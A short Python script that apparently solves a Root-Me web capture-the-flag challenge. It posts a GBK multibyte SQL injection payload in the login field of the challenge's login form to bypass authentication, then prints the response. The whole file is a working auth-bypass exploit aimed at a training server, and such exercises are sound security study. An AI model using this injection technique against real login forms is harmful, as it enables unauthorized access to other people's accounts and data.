import requests
from urllib.parse import quote

url = 'http://challenge01.root-me.org/web-serveur/ch42/'

payload = "尐' or 1=1-- --" # server expecting valid GBK character ( không thể 0xa8)

data = {'login':payload,'password':'abc'}

r = requests.post(url, data=data)

print(r.text)